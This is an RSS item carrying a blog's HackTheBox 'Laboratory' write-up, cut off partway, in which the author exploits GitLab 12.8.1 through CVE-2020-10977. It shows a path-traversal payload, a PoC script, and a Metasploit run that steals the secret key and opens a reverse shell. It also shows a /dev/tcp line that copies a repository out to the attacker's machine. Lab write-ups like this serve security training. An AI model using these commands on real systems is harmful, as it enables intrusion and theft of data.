<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>LFI2RCE on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/lfi2rce/</link>
    <description>Recent content in LFI2RCE on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 17 Apr 2021 23:25:49 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/lfi2rce/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Laboratory</title>
      <link>https://fahmifj.github.io/hackthebox/laboratory/</link>
      <pubDate>Sat, 17 Apr 2021 23:25:49 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/laboratory/</guid>
      <description>LFI to RCE on GitLab 12.8.1~12.9.0</description>
      <content:encoded><![CDATA[<p>Laboratory is features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container reveals a private user repository that contains a pair of SSH keys. The keys allows me to logs into the machine.  From there, I&rsquo;m able to gain a foothold on the box using the SSH private key. There is a SUID binary that calls <code>chmod</code> with relative path, making it vulnerable to path hijacking.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Arbitrary File Read</li>
<li>Adding Metasploit module</li>
<li>Exploiting GitLab 12.8.1~12.9.0</li>
<li>Recover a git repository</li>
<li>SUID exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Metasploit - Preinstalled in Kali Linux</li>
<li>CVE-2020-10997 Exploit PoC - <a href="https://github.com/thewhiteh4t/cve-2020-10977">https://github.com/thewhiteh4t/cve-2020-10977</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Initial scan with <code>nmap</code> shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http     Apache httpd 2.4.41
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://laboratory.htb/
</span></span><span class="line"><span class="cl">443/tcp open  ssl/http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET POST OPTIONS HEAD
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: The Laboratory
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-07-05T10:39:28
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2024-03-03T10:39:28
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   <span class="m">2873</span> 91a5 <span class="m">5022</span> f323 4b95 df98 b61a eb6c
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: <span class="m">0875</span> 3a7e eef6 8f50 <span class="m">0349</span> 510d 9fbf abc3 c70a a1ca
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>From the scan above, visiting port 80 will be redirected to <code>https://laboratory.htb</code>.</p>
<p>On the HTTPS port, the certificate discloses a subdomain.</p>
<p>From here, I&rsquo;ll add <code>laboratory.htb</code> and <code>git.laboratory.htb</code> as well to <code>/etc/hosts</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.216 laboratory.htb git.laboratory.htb&#39;</span> &gt; /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---laboratoryhtb">TCP 80 - laboratory.htb</h3>
<p>There is nothing really interesting here.</p>
<p><div class="img-container"><img src="imgs/9437ec2bf9834958a568bc836e4c625f.png" alt="8337f36ab816a0b4af1bcff5b6d79ed8.png"  /></div>
</p>
<h3 id="tcp-443---gitlaboratoryhtb">TCP 443 - git.laboratory.htb</h3>
<p>A GitLab instance is presented on this page.</p>
<p><div class="img-container"><img src="imgs/27df62df2abf49f8bea57f0e8bae36db.png" alt="fe1e6f15f33117cf19d265d7bf02e1f0.png"  /></div>
</p>
<p>I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.</p>
<p><div class="img-container"><img src="imgs/db1d849ef24942aaa0f08c2d16fc6b9b.png" alt="9c894520b4a87fd3f31e567387c472be.png"  /></div>
</p>
<p>I changed my email to <code>iamf@laboratory.htb</code> and it works.</p>
<p>The first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.</p>
<p><div class="img-container"><img src="imgs/108726d7e7ed445cb6a38d1e080676f9.png" alt="82ce9dcf1da9d53967aa746413c3efed.png"  /></div>
</p>
<p>I found another user on this website named <code>Dexter McPherson</code>. This user has a project called <code>SecureWebsite</code></p>
<p><div class="img-container"><img src="imgs/415abe033a4f4252ba3ac745473a9deb.png" alt="9d2a20bf9637ad08d2615a4f44514ca1.png"  /></div>
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p><code>searchsploit</code> shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ searchsploit gitlab
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- -----------------------------
</span></span><span class="line"><span class="cl">Exploit Title                                                           <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- -----------------------------
</span></span><span class="line"><span class="cl">GitLab - <span class="s1">&#39;impersonate&#39;</span> Feature Privilege Escalation                      <span class="p">|</span> ruby/webapps/40236.txt
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                  <span class="p">|</span> ruby/webapps/49334.py
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                <span class="p">|</span> ruby/webapps/49257.py
</span></span><span class="line"><span class="cl">GitLab 12.9.0 - Arbitrary File Read                                      <span class="p">|</span> ruby/webapps/48431.txt
</span></span><span class="line"><span class="cl">Gitlab 12.9.0 - Arbitrary File Read <span class="o">(</span>Authenticated<span class="o">)</span>                      <span class="p">|</span> ruby/webapps/49076.py
</span></span><span class="line"><span class="cl">Gitlab 6.0 - Persistent Cross-Site Scripting                             <span class="p">|</span> php/webapps/30329.sh
</span></span><span class="line"><span class="cl">Gitlab-shell - Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> linux/remote/34362.rb
</span></span><span class="line"><span class="cl">Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting        <span class="p">|</span> java/webapps/47927.txt
</span></span><span class="line"><span class="cl">NPMJS gitlabhook 0.0.17 - <span class="s1">&#39;repository&#39;</span> Remote Command Execution          <span class="p">|</span> json/webapps/47420.txt
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- ------------------------------
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-git">Shell as git</h3>
<h4 id="gitlab-cve-2020-10977---manual">GitLab CVE-2020-10977 - Manual</h4>
<blockquote>
<p>CVE-2020-10977:
GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.</p>
</blockquote>
<p>The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at <a href="https://hackerone.com/reports/827052">Hackerone</a>. The researcher also shows how that vulnerability can be turned into a remote code execution.</p>
<p>I&rsquo;ll reproduce the vulnerability by creating two projects. I&rsquo;ll name it as &ldquo;project1&rdquo; and &ldquo;project2&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422215749261.png" alt="image-20210422215749261"  /></div>
</p>
<p>After that I&rsquo;ll create an issue on &ldquo;project2&rdquo; and fill the issue description with a payload as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">![<span class="nt">a</span>](<span class="na">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd</span>)
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210422220227988.png" alt="image-20210422220227988"  /></div>
</p>
<p>I&rsquo;ll then move the issue on &ldquo;project2&rdquo; to &ldquo;project1&rdquo;</p>
<p><div class="img-container"><img src="imgs/image-20210422220401958.png" alt="image-20210422220401958"  /></div>
</p>
<p>The payload will then turn into an attached file.</p>
<p><div class="img-container"><img src="imgs/image-20210422220539185.png" alt="image-20210422220539185"  /></div>
</p>
<p>The attached file contains the content of <code>/etc/passwd</code> file from the system.</p>
<p><div class="img-container"><img src="imgs/image-20210422220624344.png" alt="image-20210422220624344"  /></div>
</p>
<h4 id="gitlab-cve-2020-10977---automated">GitLab CVE-2020-10977 - Automated</h4>
<p>There is also an <a href="https://github.com/thewhiteh4t/cve-2020-10977">automated version</a> to exploit this vulnerability written in Python.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Target        : https://git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Username      : iamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password      : iamfiamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Project Names : ProjectOne, ProjectTwo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Trying to Login...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Login Successful!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating ProjectOne...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ProjectOne Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating ProjectTwo...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ProjectTwo Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>&gt;<span class="o">]</span> Absolute Path to File : /etc/passwd
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating an Issue...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Issue Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Moving Issue...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Issue Moved Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; /etc/passwd
</span></span><span class="line"><span class="cl">----------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">git:x:998:998::/var/opt/gitlab:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
</span></span><span class="line"><span class="cl">gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
</span></span><span class="line"><span class="cl">gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
</span></span><span class="line"><span class="cl">mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
</span></span><span class="line"><span class="cl">registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="lfi-to-rce">LFI to RCE</h4>
<p>To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab <code>secret_key_base</code> with the one on Laboratory (located on <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>).  After that all is set, I&rsquo;ve to craft my own cookie to get the code execution on the system.</p>
<p>Fortunately, there is a Metasploit <a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">module</a> to perform this automatically, and I’ll use that.</p>
<p>First, I’ll have to grab the module from GitHub and put it into <code>/usr/share/metasploit-framework/modules/exploits/multi/http</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> /usr/share/metasploit-framework/modules/exploits/multi/http <span class="o">&amp;&amp;</span> wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb
</span></span></code></pre></div><p>After that I’ll re-initialize the metasploit database using <code>msfdb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ msfdb reinit
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf_test&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping database user <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Deleting configuration file /usr/share/metasploit-framework/config/database.yml
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Stopping database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating database user <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf_test&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating configuration file <span class="s1">&#39;/usr/share/metasploit-framework/config/database.yml&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating initial database schema
</span></span></code></pre></div><p>Now on Metasploit, I can use the module by issuing the command below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to generic/shell_reverse_tcp
</span></span></code></pre></div><p>Below are the options needed by the module.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> USERNAME iamf
</span></span><span class="line"><span class="cl"><span class="nv">USERNAME</span> <span class="o">=</span>&gt; iamf
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> PASSWORD iamfiamf
</span></span><span class="line"><span class="cl"><span class="nv">PASSWORD</span> <span class="o">=</span>&gt; iamfiamf
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.216
</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.216
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RPORT <span class="m">443</span>
</span></span><span class="line"><span class="cl"><span class="nv">RPORT</span> <span class="o">=</span>&gt; <span class="m">443</span>
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> SSL <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Changing the SSL option’s value may require changing RPORT!
</span></span><span class="line"><span class="cl"><span class="nv">SSL</span> <span class="o">=</span>&gt; <span class="nb">true</span>
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> VHOST git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="nv">VHOST</span> <span class="o">=</span>&gt; git.laboratory.htb
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">9001</span>
</span></span><span class="line"><span class="cl"><span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">9001</span>
</span></span></code></pre></div><p>After all the required options are set, I’ll start the exploit with the <code>run</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.39:9001 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Logged in to user iamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created issue /iamf/hpt2TORA/issues/1
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing arbitrary file load
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File saved as: <span class="s1">&#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.39:9001 -&gt; 10.10.10.216:52726<span class="o">)</span> at 2021-03-21 17:46:14 -0400
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">id<span class="p">;</span>hostname
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span>
</span></span><span class="line"><span class="cl">git.laboratory.htb
</span></span></code></pre></div><p>I have shell as user <code>git</code>.</p>
<p>There is a <code>.dockerenv</code> file in the root directory, which indicates that I&rsquo;m inside a docker container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ls -la /
</span></span><span class="line"><span class="cl">total <span class="m">88</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x   <span class="m">1</span> root root    <span class="m">0</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .dockerenv
</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root  <span class="m">157</span> Feb <span class="m">24</span>  <span class="m">2020</span> RELEASE
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root <span class="m">4096</span> Feb <span class="m">24</span>  <span class="m">2020</span> assets
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-dexter">Shell as dexter</h3>
<h4 id="container-enumeration">Container enumeration</h4>
<p>Enumerating the <code>git</code> home directory (<code>/var/opt/gitlab</code>) discovers two repositories that belongs to user <code>dexter</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~$ grep -Ri dexter 2&gt;/dev/null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securedocker
</span></span><span class="line"><span class="cl">git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securewebsite
</span></span></code></pre></div><p>I haven&rsquo;t seen that <code>dexter/securedocker</code> before in the GitLab application. So I&rsquo;ll grab that repository and transfer it to my machine</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</span></span><span class="line"><span class="cl">total <span class="m">40</span>
</span></span><span class="line"><span class="cl">drwxr-s---  <span class="m">6</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> .
</span></span><span class="line"><span class="cl">drwxr-s---  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> ..
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root   <span class="m">23</span> Jul  <span class="m">5</span>  <span class="m">2020</span> HEAD
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root  <span class="m">107</span> Jul  <span class="m">5</span>  <span class="m">2020</span> config
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root   <span class="m">73</span> Jul  <span class="m">5</span>  <span class="m">2020</span> description
</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> hooks
</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> info
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root  <span class="m">112</span> Jul  <span class="m">5</span>  <span class="m">2020</span> language-stats.cache
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">14</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> objects
</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> refs
</span></span></code></pre></div><p>First, I’ll create a tarball archive of that repository and I’ll name it as <code>exfil-securedocker-git.tar</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</span></span></code></pre></div><p>On my machine, I&rsquo;ll setup a listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
</span></span></code></pre></div><p>Back on Laboratory, I’ll send the repository  tarball to my machine using <code>cat</code> and <code>bash</code> trick</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar &gt; /dev/tcp/10.10.14.39/9000
</span></span></code></pre></div><p>My listener received the tarball.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.39<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.216<span class="o">]</span> <span class="m">42426</span>
</span></span></code></pre></div><h4 id="recovering-securedocker-repository">Recovering &lsquo;securedocker&rsquo; repository</h4>
<p>After extracting the repository,  <code>git:(master)</code> popped up in my zsh prompt which indicates this is a git repository.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
